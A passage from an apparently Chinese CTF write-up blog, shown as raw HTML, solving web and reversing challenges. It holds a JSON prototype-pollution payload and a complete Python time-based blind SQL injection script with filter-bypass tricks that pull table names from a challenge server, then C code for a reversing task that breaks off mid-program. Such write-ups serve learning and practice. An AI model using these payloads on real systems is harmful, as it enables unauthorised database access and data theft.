&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable language_">module</span>.<span class="property">exports</span> = &#123; merge &#125;;</span><br></pre></td></tr></table></figure><br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241101-214600242.png" class=""><br>看代码可以知道其可以原型链污染，我们只要污染hasFlag的原型使其有值即可<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;Starven&quot;,&quot;password&quot;:&quot;123456&quot;,&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;hasFlag&quot;:&quot;1&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-232356317.png" class="">  </p>
<img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-232424074.png" class="">  
<p>套娃，玩呢?<br>其说和前面一样，那么其后端应该还是解析json，但是我们无法传json进去这使用就要用如下方法来传值，js会将下面的传的值进行拼接，最终再json解析时仍然可以被正常解析<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241101-214437585.png" class="">  </p>
<h2 id="funnySQL"><a href="#funnySQL" class="headerlink" title="funnySQL"></a>funnySQL</h2><p>注入无回显，且过滤了sleep我们可以使用BENCHMARK(10000000,sha(1))来进行绕过空格用%OB且过滤了and和or使用&amp;&amp;来代替and。且因为or被过滤我们需要是无列名注入，且等号给过滤了，所以我们可以使用RLIKE BINARY来代替，之所以不用like是因为其不分大小写，这会导致其得到的结果可能出现偏差(大概，理论上是这样的，但是实测下来发现其实用like问题好像也不大)<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-200112313.png" class="">  </p>
<p>剩下的其实就是盲注加无列名注入了<br>exp如下<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://80-8f8f8fb9-06cc-4f43-ae84-73b883155c4b.challenge.ctfplus.cn/&quot;</span></span><br><span class="line">params = &#123;<span class="string">&quot;action&quot;</span>: <span class="string">&quot;check&quot;</span>,<span class="string">&quot;username&quot;</span>:<span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">dic = <span class="string">&quot;ZXCVBNMLKJHGFDSAQWERTYUIOPabcdefghijklmnopqrstuvwxyz1234567890_&#123;&#125;,-&quot;</span></span><br><span class="line">flag= <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">500</span>):</span><br><span class="line">    time.sleep(<span class="number">0.06</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(dic)):</span><br><span class="line">        char=dic[j]</span><br><span class="line">        payload = <span class="string">&quot;username=1&#x27;%26%26if(substr((select%0Bgroup_concat(table_name)%0Bfrom%0Bmysql.innodb_table_stats),&#123;&#125;,1)RLIKE%0BBINARY%0B&#x27;&#123;&#125;&#x27;,BENCHMARK(10000000,sha(1)),BENCHMARK(0,sha(1)))%23&quot;</span> .<span class="built_in">format</span>(i,char)</span><br><span class="line">        <span class="comment">#payload=&quot;username=1&#x27;%26%26if(substr((select%0B`1`%0Bfrom(select%0B1%0Bunion%0Bselect%0B*%0Bfrom%0BRea11ys3ccccccr3333t)x%0Blimit%0B1,1),&#123;&#125;,1)RLIKE%0BBINARY%0B&#x27;&#123;&#125;&#x27;,BENCHMARK(14000000,sha(1)),BENCHMARK(1,sha(1)))%23&quot; .format(i,char)</span></span><br><span class="line">        <span class="comment">#payload = &quot;username=1&#x27;%26%26if(substr((select%0Bgroup_concat(table_name)%0Bfrom%0Bsys.schema_auto_increment_columns%0Bwhere%0Btable_schema=database()),&#123;&#125;,1)like%0B&#x27;&#123;&#125;&#x27;,BENCHMARK(3000000,sha(1)),BENCHMARK(0,sha(1)))%23&quot; .format(i,char)</span></span><br><span class="line"></span><br><span class="line">        sql_url=url+<span class="string">&quot;?&quot;</span>+payload</span><br><span class="line">        start_time = time.time()</span><br><span class="line">        r = requests.get(sql_url,verify=<span class="literal">False</span>)</span><br><span class="line">        end_time = time.time()</span><br><span class="line">        <span class="built_in">print</span>(end_time - start_time)</span><br><span class="line">        <span class="keyword">if</span> end_time - start_time &gt; <span class="number">4</span>:</span><br><span class="line">            <span class="built_in">print</span>(end_time - start_time)</span><br><span class="line">            flag += char</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><br>可以爆破出表面如下<br>gtid_slave_pos,Rea11ys3ccccccr3333t,users<br>而flag在Rea11ys3ccccccr3333t内<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241112-190718786.png" class="">  </p>
<h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="也许你也听jay"><a href="#也许你也听jay" class="headerlink" title="也许你也听jay"></a>也许你也听jay</h2><p>打开附件是.c代码<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241114-001354891.png" class=""><br>先把变量名换一下<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">   </span><br><span class="line">    <span class="type">char</span> URL[<span class="number">46</span>];</span><br><span class="line">    <span class="type">char</span> aaaa[<span class="number">46</span>];</span><br><span class="line">    <span class="built_in">strcpy</span>(aaaa, URL);</span><br><span class="line">    <span class="type">char</span> bbb[] = &#123;<span class="number">0x96</span>, <span class="number">0xa1</span>, <span class="number">0xa0</span>, <span class="number">0x9b</span>, <span class="number">0x9b</span>, <span class="number">0x5f</span>, <span class="number">0x49</span>, <span class="number">0x46</span>, <span class="number">0x85</span>, <span class="number">0x82</span>, <span class="number">0x53</span>, <span class="number">0x95</span>, <span class="number">0x7d</span>, <span class="number">0x36</span>, <span class="number">0x8d</span>, <span class="number">0x74</span>, <span class="number">0x82</span>, <span class="number">0x88</span>, <span class="number">0x46</span>, <span class="number">0x7a</span>, <span class="number">0x81</span>, <span class="number">0x65</span>, <span class="number">0x80</span>, <span class="number">0x6c</span>, <span class="number">0x78</span>, <span class="number">0x2f</span>, <span class="number">0x6b</span>, <span class="number">0x6a</span>, <span class="number">0x27</span>, <span class="number">0x50</span>, <span class="number">0x61</span>, <span class="number">0x38</span>, <span class="number">0x3f</span>, <span class="number">0x37</span>, <span class="number">0x33</span>, <span class="number">0xf1</span>, <span class="number">0x27</span>, <span class="number">0x32</span>, <span class="number">0x34</span>, <span class="number">0x1f</span>, <span class="number">0x39</span>, <span class="number">0x23</span>, <span class="number">0xde</span>, <span class="number">0x1c</span>, <span class="number">0x17</span>, <span class="number">0xd4</span>&#125;;</span><br><span class="line">    <span class="type">int</span>  ccc[] = &#123;<span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x04</span>, <span class="number">0x05</span>, <span class="number">0x06</span>, <span class="number">0x07</span>, <span class="number">0x08</span>, <span class="number">0x09</span>, <span class="number">0x0A</span>, <span class="number">0x0B</span>, <span class="number">0x0C</span>, <span class="number">0x0D</span>, <span class="number">0x0E</span>, <span class="number">0x0F</span>, <span class="number">0x10</span>, <span class="number">0x11</span>, <span class="number">0x12</span>, <span class="number">0x13</span>, <span class="number">0x14</span>, <span class="number">0x15</span>, <span class="number">0x16</span>, <span class="number">0x17</span>, <span class="number">0x18</span>, <span class="number">0x19</span>, <span class="number">0x1A</span>, <span class="number">0x1B</span>, <span class="number">0x1C</span>, <span class="number">0x1D</span>, <span class="number">0x1E</span>, <span class="number">0x1F</span>, <span class="number">0x20</span>, <span class="number">0x21</span>, <span class="number">0x22</span>, <span class="number">0x23</span>, <span class="number">0x24</span>, <span class="number">0x25</span>, <span class="number">0x26</span>, <span class="number">0x27</span>, <span class="number">0x28</span>, <span class="number">0x29</span>, <span class="number">0x2A</span>, <span class="number">0x2B</span>, <span class="number">0x2C</span>, <span class="number">0x2D</span>, <span class="number">0x2E</span>, <span class="number">0x2F</span>, <span class="number">0x30</span>, <span class="number">0x31</span>, <span class="number">0x32</span>, <span class="number">0x33</span>, <span class="number">0x34</span>, <span class="number">0x35</span>, <span class="number">0x36</span>, <span class="number">0x37</span>, <span class="number">0x38</span>, <span class="number">0x39</span>, <span class="number">0x3A</span>, <span class="number">0x3B</span>, <span class="number">0x3C</span>, <span class="number">0x3D</span>, <span class="number">0x3E</span>, <span class="number">0x3F</span>, <span class="number">0x40</span>, <span class="number">0x41</span>, <span class="number">0x42</span>, <span class="number">0x43</span>, <span class="number">0x44</span>, <span class="number">0x45</span>, <span class="number">0x46</span>, <span class="number">0x47</span>, <span class="number">0x48</span>, <span class="number">0x49</span>, <span class="number">0x4A</span>, <span class="number">0x4B</span>, <span class="number">0x4C</span>, <span class="number">0x4D</span>, <span class="number">0x4E</span>, <span class="number">0x4F</span>, <span class="number">0x50</span>, <span class="number">0x51</span>, <span class="number">0x52</span>, <span class="number">0x53</span>, <span class="number">0x54</span>, <span class="number">0x55</span>, <span class="number">0x56</span>, <span class="number">0x57</span>, <span class="number">0x58</span>, <span class="number">0x59</span>, <span class="number">0x5A</span>, <span class="number">0x5B</span>, <span class="number">0x5C</span>, <span class="number">0x5D</span>, <span class="number">0x5E</span>, <span class="number">0x5F</span>, <span class="number">0x60</span>, <span class="number">0x61</span>, <span class="number">0x62</span>, <span class="number">0x63</span>, <span class="number">0x64</span>, <span class="number">0x65</span>, <span class="number">0x66</span>, <span class="number">0x67</span>, <span class="number">0x68</span>, <span class="number">0x69</span>, <span class="number">0x6A</span>, <span class="number">0x6B</span>, <span class="number">0x6C</span>, <span class="number">0x6D</span>, <span class="number">0x6E</span>, <span class="number">0x6F</span>, <span class="number">0x70</span>, <span class="number">0x71</span>, <span class="number">0x72</span>, <span class="number">0x73</span>, <span class="number">0x74</span>, <span class="number">0x75</span>, <span class="number">0x76</span>, <span class="number">0x77</span>, <span class="number">0x78</span>, <span class="number">0x79</span>, <span class="number">0x7A</span>, <span class="number">0x7B</span>, <span class="number">0x7C</span>, <span class="number">0x7D</span>, <span class="number">0x7E</span>, <span class="number">0x7F</span>, <span class="number">0x80</span>, <span class="number">0x81</span>, <span class="number">0x82</span>, <span class="number">0x83</span>, <span class="number">0x84</span>, <span class="number">0x85</span>, <span class="number">0x86</span>, <span class="number">0x87</span>, <span class="number">0x88</span>, <span class="number">0x89</span>, <span class="number">0x8A</span>, <span class="number">0x8B</span>, <span class="number">0x8C</span>, <span class="number">0x8D</span>&#125;;</span><br><span class="line">    <span class="type">int</span>  dddd[] = &#123;<span class="number">0x5D</span>, <span class="number">0x5C</span>, <span class="number">0x5B</span>, <span class="number">0x5A</span>, <span class="number">0x59</span>, <span class="number">0x58</span>, <span class="number">0x57</span>, <span class="number">0x56</span>, <span class="number">0x55</span>, <span class="number">0x54</span>, <span class="number">0x53</span>, <span class="number">0x52</span>, <span class="number">0x51</span>, <span class="number">0x50</span>, <span class="number">0x4F</span>, <span class="number">0x4E</span>, <span class="number">0x4D</span>, <span class="number">0x4C</span>, <span class="number">0x4B</span>, <span class="number">0x4A</span>, <span class="number">0x49</span>, <span class="number">0x48</span>, <span class="number">0x47</span>, <span class="number">0x46</span>, <span class="number">0x45</span>, <span class="number">0x44</span>, <span class="number">0x43</span>, <span class="number">0x42</span>, <span class="number">0x41</span>, <span class="number">0x40</span>, <span class="number">0x3F</span>, <span class="number">0x3E</span>, <span class="number">0x3D</span>, <span class="number">0x3C</span>, <span class="number">0x3B</span>, <span class="number">0x3A</span>, <span class="number">0x39</span>, <span class="number">0x38</span>, <span class="number">0x37</span>, <span class="number">0x36</span>, <span class="number">0x35</span>, <span class="number">0x34</span>, <span class="number">0x33</span>, <span class="number">0x32</span>, <span class="number">0x31</span>, <span class="number">0x30</span>, <span class="number">0x2F</span>, <span class="number">0x2E</span>, <span class="number">0x2D</span>, <span class="number">0x2C</span>, <span class="number">0x2B</span>, <span class="number">0x2A</span>, <span class="number">0x29</span>, <span class="number">0x28</span>, <span class="number">0x27</span>, <span class="number">0x26</span>, <span class="number">0x25</span>, <span class="number">0x24</span>, <span class="number">0x23</span>, <span class="number">0x22</span>, <span class="number">0x21</span>, <span class="number">0x20</span>, <span class="number">0x1F</span>, <span class="number">0x1E</span>, <span class="number">0x1D</span>, <span class="number">0x1C</span>, <span class="number">0x1B</span>, <span class="number">0x1A</span>, <span class="number">0x19</span>, <span class="number">0x18</span>, <span class="number">0x17</span>, <span class="number">0x16</span>, <span class="number">0x15</span>, <span class="number">0x14</span>, <span class="number">0x13</span>, <span class="number">0x12</span>, <span class="number">0x11</span>, <span class="number">0x10</span>, <span class="number">0x0F</span>, <span class="number">0x0E</span>, <span class="number">0x0D</span>, <span class="number">0x0C</span>, <span class="number">0x0B</span>, <span class="number">0x0A</span>, <span class="number">0x09</span>, <span class="number">0x08</span>, <span class="number">0x07</span>, <span class="number">0x06</span>, <span class="number">0x05</span>, <span class="number">0x04</span>, <span class="number">0x03</span>, <span class="number">0x02</span>, <span class="number">0x01</span>&#125;;</span><br><span class="line">    <span class="type">int</span> eeee[]=&#123;<span class="number">0x65</span>, <span class="number">0x64</span>, <span class="number">0x63</span>, <span class="number">0x62</span>, <span class="number">0x61</span>, <span class="number">0x60</span>, <span class="number">0x5F</span>, <span class="number">0x5E</span>, <span class="number">0x5D</span>, <span class="number">0x5C</span>, <span class="number">0x5B</span>, <span class="number">0x5A</span>, <span class="number">0x59</span>, <span class="number">0x58</span>, <span class="number">0x57</span>, <span class="number">0x56</span>, <span class="number">0x55</span>, <span class="number">0x54</span>, <span class="number">0x53</span>, <span class="number">0x52</span>, <span class="number">0x51</span>, <span class="number">0x50</span>, <span class="number">0x4F</span>, <span class="number">0x4E</span>, <span class="number">0x4D</span>, <span class="number">0x4C</span>, <span class="number">0x4B</span>, <span class="number">0x4A</span>, <span class="number">0x49</span>, <span class="number">0x48</span>, <span class="number">0x47</span>, <span class="number">0x46</span>, <span class="number">0x45</span>, <span class="number">0x44</span>, <span class="number">0x43</span>, <span class="number">0x42</span>, <span class="number">0x41</span>, <span class="number">0x40</span>, <span class="number">0x3F</span>, <span class="number">0x3E</span>, <span class="number">0x3D</span>, <span class="number">0x3C</span>, <span class="number">0x3B</span>, <span class="number">0x3A</span>, <span class="number">0x39</span>, <span class="number">0x38</span>, <span class="number">0x37</span>, <span class="number">0x36</span>, <span class="number">0x35</span>, <span class="number">0x34</span>, <span class="number">0x33</span>, <span class="number">0x00</span>, <span class="number">0x31</span>, <span class="number">0x30</span>, <span class="number">0x2F</span>&#125;;</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(URL);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        eeee[i] ^=  dddd[i+<span class="number">1</span>];  </span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        aaaa[i] ^=  ccc[i];  </span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">     <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        eeee[i] -=  ccc[i];  </span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            aaaa[i] -=  ccc[<span class="number">47</span> + i];  </span><br><span class="line">             ccc[i]^=eeee[<span class="number">51</span>];</span><br><span class="line">        </span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        aaaa[i] +=  dddd[i];  </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(aaaa[i] != bbb[i])&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>然后看一下逻辑可以知道<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241118-130039021.png" class="">  </p>
<p>加密的最终结果就是bbb那么我们只要逆回去即可<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span>  dddd[] = &#123;<span class="number">0x5D</span>, <span class="number">0x5C</span>, <span class="number">0x5B</span>, <span class="number">0x5A</span>, <span class="number">0x59</span>, <span class="number">0x58</span>, <span class="number">0x57</span>, <span class="number">0x56</span>, <span class="number">0x55</span>, <span class="number">0x54</span>, <span class="number">0x53</span>, <span class="number">0x52</span>, <span class="number">0x51</span>, <span class="number">0x50</span>, <span class="number">0x4F</span>, <span class="number">0x4E</span>, <span class="number">0x4D</span>, <span class="number">0x4C</span>, <span class="number">0x4B</span>, <span class="number">0x4A</span>, <span class="number">0x49</span>, <span class="number">0x48</span>, <span class="number">0x47</span>, <span class="number">0x46</span>, <span class="number">0x45</span>, <span class="number">0x44</span>, <span class="number">0x43</span>, <span class="number">0x42</span>, <span class="number">0x41</span>, <span class="number">0x40</span>, <span class="number">0x3F</span>, <span class="number">0x3E</span>, <span class="number">0x3D</span>, <span class="number">0x3C</span>, <span class="number">0x3B</span>, <span class="number">0x3A</span>, <span class="number">0x39</span>, <span class="number">0x38</span>, <span class="number">0x37</span>, <span class="number">0x36</span>, <span class="number">0x35</span>, <span class="number">0x34</span>, <span class="number">0x33</span>, <span class="number">0x32</span>, <span class="number">0x31</span>, <span class="number">0x30</span>, <span class="number">0x2F</span>, <span class="number">0x2E</span>, <span class="number">0x2D</span>, <span class="number">0x2C</span>, <span class="number">0x2B</span>, <span class="number">0x2A</span>, <span class="number">0x29</span>, <span class="number">0x28</span>, <span class="number">0x27</span>, <span class="number">0x26</span>, <span class="number">0x25</span>, <span class="number">0x24</span>, <span class="number">0x23</span>, <span class="number">0x22</span>, <span class="number">0x21</span>, <span class="number">0x20</span>, <span class="number">0x1F</span>, <span class="number">0x1E</span>, <span class="number">0x1D</span>, <span class="number">0x1C</span>, <span class="number">0x1B</span>, <span class="number">0x1A</span>, <span class="number">0x19</span>, <span class="number">0x18</span>, <span class="number">0x17</span>, <span class="number">0x16</span>, <span class="number">0x15</span>, <span class="number">0x14</span>, <span class="number">0x13</span>, <span class="number">0x12</span>, <span class="number">0x11</span>, <span class="number">0x10</span>, <span class="number">0x0F</span>, <span class="number">0x0E</span>, <span class="number">0x0D</span>, <span class="number">0x0C</span>, <span class="number">0x0B</span>, <span class="number">0x0A</span>, <span class="number">0x09</span>, <span class="number">0x08</span>, <span class="number">0x07</span>, <span class="number">0x06</span>, <span class="number">0x05</span>, <span class="number">0x04</span>, <span class="number">0x03</span>, <span class="number">0x02</span>, <span class="number">0x01</span>&#125;;</span><br><span class="line">    <span class="type">int</span> eeee[]=&#123;<span class="number">0x65</span>, <span class="number">0x64</span>, <span class="number">0x63</span>, <span class="number">0x62</span>, <span class="number">0x61</span>, <span class="number">0x60</span>, <span class="number">0x5F</span>, <span class="number">0x5E</span>, <span class="number">0x5D</span>, <span class="number">0x5C</span>, <span class="number">0x5B</span>, <span class="number">0x5A</span>, <span class="number">0x59</span>, <span class="number">0x58</span>, <span class="number">0x57</span>, <span class="number">0x56</span>, <span class="number">0x55</span>, <span class="number">0x54</span>, <span class="number">0x53</span>, <span class="number">0x52</span>, <span class="number">0x51</span>, <span class="number">0x50</span>, <span class="number">0x4F</span>, <span class="number">0x4E</span>, <span class="number">0x4D</span>, <span class="number">0x4C</span>, <span class="number">0x4B</span>, <span class="number">0x4A</span>, <span class="number">0x49</span>, <span class="number">0x48</span>, <span class="number">0x47</span>, <span class="number">0x46</span>, <span class="number">0x45</span>, <span class="number">0x44</span>, <span class="number">0x43</span>, <span class="number">0x42</span>, <span class="number">0x41</span>, <span class="number">0x40</span>, <span class="number">0x3F</span>, <span class="number">0x3E</span>, <span class="number">0x3D</span>, <span class="number">0x3C</span>, <span class="number">0x3B</span>, <span class="number">0x3A</span>, <span class="number">0x39</span>, <span class="number">0x38</span>, <span class="number">0x37</span>, <span class="number">0x36</span>, <span class="number">0x35</span>, <span class="number">0x34</span>, <span class="number">0x33</span>, <span class="number">0x00</span>, <span class="number">0x31</span>, <span class="number">0x30</span>, <span class="number">0x2F</span>&#125;;</span><br><span class="line">    <span class="type">int</span>  ccc[] = &#123;<span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x04</span>, <span class="number">0x05</span>, <span class="number">0x06</span>, <span class="number">0x07</span>, <span class="number">0x08</span>, <span class="number">0x09</span>, <span class="number">0x0A</span>, <span class="number">0x0B</span>, <span class="number">0x0C</span>, <span class="number">0x0D</span>, <span class="number">0x0E</span>, <span class="number">0x0F</span>, <span class="number">0x10</span>, <span class="number">0x11</span>, <span class="number">0x12</span>, <span class="number">0x13</span>, <span class="number">0x14</span>, <span class="number">0x15</span>, <span class="number">0x16</span>, <span class="number">0x17</span>, <span class="number">0x18</span>, <span class="number">0x19</span>, <span class="number">0x1A</span>, <span class="number">0x1B</span>, <span class="number">0x1C</span>, <span class="number">0x1D</span>, <span class="number">0x1E</span>, <span class="number">0x1F</span>, <span class="number">0x20</span>, <span class="number">0x21</span>, <span class="number">0x22</span>, <span class="number">0x23</span>, <span class="number">0x24</span>, <span class="number">0x25</span>, <span class="number">0x26</span>, <span class="number">0x27</span>, <span class="number">0x28</span>, <span class="number">0x29</span>, <span class="number">0x2A</span>, <span class="number">0x2B</span>, <span class="number">0x2C</span>, <span class="number">0x2D</span>, <span class="number">0x2E</span>, <span class="number">0x2F</span>, <span class="number">0x30</span>, <span class="number">0x31</span>, <span class="number">0x32</span>, <span class="number">0x33</span>, <span class="number">0x34</span>, <span class="number">0x35</span>, <span class="number">0x36</span>, <span class="number">0x37</span>, <span class="number">0x38</span>, <span class="number">0x39</span>, <span class="number">0x3A</span>, <span class="number">0x3B</span>, <span class="number">0x3C</span>, <span class="number">0x3D</span>, <span class="number">0x3E</span>, <span class="number">0x3F</span>, <span class="number">0x40</span>, <span class="number">0x41</span>, <span class="number">0x42</span>, <span class="number">0x43</span>, <span class="number">0x44</span>, <span class="number">0x45</span>, <span class="number">0x46</span>, <span class="number">0x47</span>, <span class="number">0x48</span>, <span class="number">0x49</span>, <span class="number">0x4A</span>, <span class="number">0x4B</span>, <span class="number">0x4C</span>, <span class="number">0x4D</span>, <span class="number">0x4E</span>, <span class="number">0x4F</span>, <span class="number">0x50</span>, <span class="number">0x51</span>, <span class="number">0x52</span>, <span class="number">0x53</span>, <span class="number">0x54</span>, <span class="number">0x55</span>, <span class="number">0x56</span>, <span class="number">0x57</span>, <span class="number">0x58</span>, <span class="number">0x59</span>, <span class="number">0x5A</span>, <span class="number">0x5B</span>, <span class="number">0x5C</span>, <span class="number">0x5D</span>, <span class="number">0x5E</span>, <span class="number">0x5F</span>, <span class="number">0x60</span>, <span class="number">0x61</span>, <span class="number">0x62</span>, <span class="number">0x63</span>, <span class="number">0x64</span>, <span class="number">0x65</span>, <span class="number">0x66</span>, <span class="number">0x67</span>, <span class="number">0x68</span>, <span class="number">0x69</span>, <span class="number">0x6A</span>, <span class="number">0x6B</span>, <span class="number">0x6C</span>, <span class="number">0x6D</span>, <span class="number">0x6E</span>, <span class="number">0x6F</span>, <span class="number">0x70</span>, <span class="number">0x71</span>, <span class="number">0x72</span>, <span class="number">0x73</span>, <span class="number">0x74</span>, <span class="number">0x75</span>, <span class="number">0x76</span>, <span class="number">0x77</span>, <span class="number">0x78</span>, <span class="number">0x79</span>, <span class="number">0x7A</span>, <span class="number">0x7B</span>, <span class="number">0x7C</span>, <span class="number">0x7D</span>, <span class="number">0x7E</span>, <span class="number">0x7F</span>, <span class="number">0x80</span>, <span class="number">0x81</span>, <span class="number">0x82</span>, <span class="number">0x83</span>, <span class="number">0x84</span>, <span class="number">0x85</span>, <span class="number">0x86</span>, <span class="number">0x87</span>, <span class="number">0x88</span>, <span class="number">0x89</span>, <span class="number">0x8A</span>, <span class="number">0x8B</span>, <span class="number">0x8C</span>, <span class="number">0x8D</span>&#125;;</span><br><span class="line">    <span class="type">int</span> len=<span class="number">46</span>;</span><br><span class="line"><span class="type">char</span> bbb[] = &#123;<span class="number">0x96</span>, <span class="number">0xa1</span>, <span class="number">0xa0</span>, <span class="number">0x9b</span>, <span class="number">0x9b</span>, <span class="number">0x5f</span>, <span class="number">0x49</span>, <span class="number">0x46</span>, <span class="number">0x85</span>, <span class="number">0x82</span>, <span class="number">0x53</span>, <span class="number">0x95</span>, <span class="number">0x7d</span>, <span class="number">0x36</span>, <span class="number">0x8d</span>, <span class="number">0x74</span>, <span class="number">0x82</span>, <span class="number">0x88</span>, <span class="number">0x46</span>, <span class="number">0x7a</span>, <span class="number">0x81</span>, <span class="number">0x65</span>, <span class="number">0x80</span>, <span class="number">0x6c</span>, <span class="number">0x78</span>, <span class="number">0x2f</span>, <span class="number">0x6b</span>, <span class="number">0x6a</span>, <span class="number">0x27</span>, <span class="number">0x50</span>, <span class="number">0x61</span>, <span class="number">0x38</span>, <span class="number">0x3f</span>, <span class="number">0x37</span>, <span class="number">0x33</span>, <span class="number">0xf1</span>, <span class="number">0x27</span>, <span class="number">0x32</span>, <span class="number">0x34</span>, <span class="number">0x1f</span>, <span class="number">0x39</span>, <span class="number">0x23</span>, <span class="number">0xde</span>, <span class="number">0x1c</span>, <span class="number">0x17</span>, <span class="number">0xd4</span>&#125;;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        bbb[i] -=  dddd[i];  </span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        